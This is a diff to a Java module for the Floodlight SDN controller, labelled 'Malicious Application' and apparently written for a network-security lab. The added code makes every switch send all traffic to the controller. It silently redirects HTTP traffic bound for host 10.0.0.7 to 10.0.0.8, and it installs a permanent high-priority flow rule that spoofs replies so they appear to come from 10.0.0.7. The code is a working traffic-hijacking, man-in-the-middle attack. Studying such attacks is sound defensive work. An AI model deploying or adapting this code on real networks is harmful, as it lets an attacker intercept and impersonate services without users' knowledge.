@@ -4,24 +4,8 @@ import java.io.IOException;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Collection;
-import java.util.HashMap;
 import java.util.Iterator;
-import java.util.List;
 import java.util.Map;
-import java.util.Set;
-
-import org.openflow.protocol.OFFlowMod;
-import org.openflow.protocol.OFMatch;
-import org.openflow.protocol.OFMessage;
-import org.openflow.protocol.OFPacketIn;
-import org.openflow.protocol.OFPacketOut;
-import org.openflow.protocol.OFPort;
-import org.openflow.protocol.OFType;
-import org.openflow.protocol.action.OFAction;
-import org.openflow.protocol.action.OFActionOutput;
-import org.openflow.util.U16;
-import org.slf4j.Logger;
-import org.slf4j.LoggerFactory;
 
 import net.floodlightcontroller.core.FloodlightContext;
 import net.floodlightcontroller.core.IFloodlightProviderService;
@@ -41,6 +25,23 @@ import net.floodlightcontroller.packet.Ethernet;
 import net.floodlightcontroller.packet.IPv4;
 import net.floodlightcontroller.routing.Link;
 
+import org.openflow.protocol.OFFlowMod;
+import org.openflow.protocol.OFMatch;
+import org.openflow.protocol.OFMessage;
+import org.openflow.protocol.OFPacketIn;
+import org.openflow.protocol.OFPacketOut;
+import org.openflow.protocol.OFPort;
+import org.openflow.protocol.OFType;
+import org.openflow.protocol.action.OFAction;
+import org.openflow.protocol.action.OFActionDataLayerDestination;
+import org.openflow.protocol.action.OFActionDataLayerSource;
+import org.openflow.protocol.action.OFActionNetworkLayerDestination;
+import org.openflow.protocol.action.OFActionNetworkLayerSource;
+import org.openflow.protocol.action.OFActionOutput;
+import org.openflow.util.U16;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
+
 /**
  * Module to perform round-robin load balancing.
  * 
@@ -59,6 +60,8 @@ public class Subvert implements IOFMessageListener, IFloodlightModule, IOFSwitch
 	// Interface to the logging system
 	protected static Logger logger;
 	
+	private boolean ruleInstalled = false;
+	
 	// TODO Create list of servers to which traffic should be balanced
 	
 	/**
@@ -67,7 +70,7 @@ public class Subvert implements IOFMessageListener, IFloodlightModule, IOFSwitch
 	 * */
 	@Override
 	public String getName() {
-		return Subvert.class.getSimpleName();
+		return "Malicious Application";
 	}
 
 	@Override
@@ -128,6 +131,7 @@ public class Subvert implements IOFMessageListener, IFloodlightModule, IOFSwitch
 	@Override
 	public void startUp(FloodlightModuleContext context) {
 		floodlightProvider.addOFMessageListener(OFType.PACKET_IN, this);
+		floodlightProvider.addOFSwitchListener(this);
 	}
 	
 	/**
@@ -169,6 +173,13 @@ public class Subvert implements IOFMessageListener, IFloodlightModule, IOFSwitch
         }
         
         if(sw.getId() != deviceAttachment.getSwitchDPID()){
+        	// send this packet along unchanged
+        	ArrayList<OFAction> action = new ArrayList<OFAction>();
+        	OFActionOutput outputPort = new OFActionOutput((short)deviceAttachment.getPort());
+        	action.add(outputPort);
+        	pushPacket(sw, pi, cntx, action, (short)OFActionOutput.MINIMUM_LENGTH);
+        	
+        	// let another module process this packet as well
         	return Command.CONTINUE;
         }
 		
@@ -177,22 +188,98 @@ public class Subvert implements IOFMessageListener, IFloodlightModule, IOFSwitch
 				match.getNetworkProtocol() == IPv4.PROTOCOL_TCP  &&
 				match.getTransportDestination() == (short)80){
 			
-			remapH7toH8(sw, pi);
+			remapH7toH8(sw, pi, (short)deviceAttachment.getPort(), cntx);
 			return Command.STOP;
 		}
-	
 		return Command.CONTINUE;
     }
 	
-	private void remapH7toH8(IOFSwitch sw, OFPacketIn pi){
+	private void remapH7toH8(IOFSwitch sw, OFPacketIn pi, short outputPort, FloodlightContext cntx){
+		logger.debug("-----------REMAP THIS PACKET TO GO TO H8 INSTEAD OF H7--------------\n");
+		
+		if(!ruleInstalled){
+			installReverseRule(sw);
+		}
+		
 		ArrayList<OFAction> actions = new ArrayList<OFAction>();
 		
+		// TODO the destination address isn't getting rewritten for some reason.
+		// INVESTIGATE!!!
+		
+		OFActionDataLayerDestination dlDst = new OFActionDataLayerDestination(Ethernet.toMACAddress("00:00:00:00:00:08"));
+		actions.add(dlDst);
+		
+		OFActionNetworkLayerDestination nwDest = new OFActionNetworkLayerDestination(IPv4.toIPv4Address("10.0.0.8"));		
+		actions.add(nwDest);
+		
+		OFActionOutput outputTo = new OFActionOutput(outputPort);
+		actions.add(outputTo);
+				
+		pushPacket(sw, pi, cntx, actions, (short)(OFActionOutput.MINIMUM_LENGTH + OFActionNetworkLayerDestination.MINIMUM_LENGTH +
+				OFActionDataLayerDestination.MINIMUM_LENGTH));
+	}
+	
+	private void installReverseRule(IOFSwitch sw){
+		ruleInstalled = true;
+		
+        long dl_dst = Ethernet.toLong(Ethernet.toMACAddress("00:00:00:00:00:01"));
+        int nw_dst = IPv4.toIPv4Address("10.0.0.1");
+		
+        // Find switch and port to which destination device is connected
+        SwitchPort deviceAttachment = findDeviceAttachment(dl_dst, nw_dst);
+        if (null == deviceAttachment) {
+        	logger.debug("Can't find the switch!!!---------------------");
+        	return;
+        	// TODO: Handle case where device is not known
+        }
+        short outputPort = (short)deviceAttachment.getPort();
+        
+        OFFlowMod rule = (OFFlowMod)floodlightProvider.getOFMessageFactory().getMessage(OFType.FLOW_MOD);
+		rule.setType(OFType.FLOW_MOD);
+	    rule.setCommand(OFFlowMod.OFPFC_ADD);
+	    
+	    OFMatch match = new OFMatch();
+	    match.setWildcards(~(OFMatch.OFPFW_DL_SRC | OFMatch.OFPFW_DL_DST | OFMatch.OFPFW_DL_TYPE | OFMatch.OFPFW_NW_PROTO | OFMatch.OFPFW_TP_SRC));
+	    match.setDataLayerType((short)0x0800);
+	    match.setDataLayerSource("00:00:00:00:00:08");
+	    match.setDataLayerDestination("00:00:00:00:00:01");
+	    match.setNetworkProtocol(IPv4.PROTOCOL_TCP);
+	    match.setTransportSource((short)80);
+	    
+	    rule.setMatch(match);
+	    
+	    ArrayList<OFAction> actions = new ArrayList<OFAction>();
+
+	    OFActionDataLayerSource dlSrc = new OFActionDataLayerSource(Ethernet.toMACAddress("00:00:00:00:00:07"));
+	    actions.add(dlSrc);
+	    
+	    OFActionNetworkLayerSource nwSrc = new OFActionNetworkLayerSource(IPv4.toIPv4Address("10.0.0.7"));
+	    actions.add(nwSrc);
+    
+	    OFActionOutput outputTo = new OFActionOutput(outputPort);
+	    actions.add(outputTo);
+	    
+	    rule.setActions(actions);
+	    rule.setLength((short)(OFFlowMod.MINIMUM_LENGTH + OFActionOutput.MINIMUM_LENGTH + OFActionNetworkLayerSource.MINIMUM_LENGTH +
+	    		OFActionDataLayerSource.MINIMUM_LENGTH));
+	    
+	    rule.setBufferId(OFPacketOut.BUFFER_ID_NONE);
+	    rule.setIdleTimeout((short)0);
+	    rule.setHardTimeout((short)0);
+	    rule.setPriority((short)10000);
+	    
+	    try{
+	    	sw.write(rule, null);
+	    	sw.flush();
+	    }catch(Exception e){
+	    	logger.error("Could not send subversive static rule to the switch");
+	    }
 	}
 	
 	/**
 	 * Sends a packet out to the switch
 	 */
-	private void pushPacket(IOFSwitch sw, OFPacketIn pi, 
+	private void pushPacket(IOFSwitch sw, OFPacketIn pi, FloodlightContext cntx, 
 			ArrayList<OFAction> actions, short actionsLength) {
 		
 		// create an OFPacketOut for the pushed packet
@@ -206,6 +293,7 @@ public class Subvert implements IOFMessageListener, IFloodlightModule, IOFSwitch
         // Set the actions to apply for this packet		
 		po.setActions(actions);
 		po.setActionsLength(actionsLength);
+		
 	        
         // Set data if it is included in the packet in but buffer id is NONE
         if (pi.getBufferId() == OFPacketOut.BUFFER_ID_NONE) {
@@ -218,7 +306,7 @@ public class Subvert implements IOFMessageListener, IFloodlightModule, IOFSwitch
                     + po.getActionsLength()));
         }        
         
-        logger.debug("Push packet to switch: "+po);
+        logger.debug("Push packet to switch: " + po);
         
         // Push the packet to the switch
         try {
@@ -292,7 +380,7 @@ public class Subvert implements IOFMessageListener, IFloodlightModule, IOFSwitch
 
 	@Override
 	public void addedSwitch(IOFSwitch sw) {
-		// TODO Auto-generated method stub
+		//logger.debug("------------------NEW SWITCH ADDED, IN SUBVERT---------------");
 		puntToController(sw);
 		
 	}
@@ -315,7 +403,7 @@ public class Subvert implements IOFMessageListener, IFloodlightModule, IOFSwitch
 	 */
 	
 	private void puntToController(IOFSwitch sw){
-		logger.debug("Malicious application inserting flow to punt all traffic to controller");
+		logger.debug("\nMalicious application inserting flow to punt all traffic to controller\n");
 		
 		OFFlowMod rule = (OFFlowMod)floodlightProvider.getOFMessageFactory().getMessage(OFType.FLOW_MOD);
 		rule.setType(OFType.FLOW_MOD);
@@ -340,7 +428,7 @@ public class Subvert implements IOFMessageListener, IFloodlightModule, IOFSwitch
 	    rule.setBufferId(OFPacketOut.BUFFER_ID_NONE);
 	    rule.setLength((short)(OFFlowMod.MINIMUM_LENGTH + OFActionOutput.MINIMUM_LENGTH));
 	    rule.setIdleTimeout((short)0);
-	    rule.setHardTimeout((short)80);
+	    rule.setHardTimeout((short)0);
 	    rule.setPriority((short)10000);
 	    
 	    try{
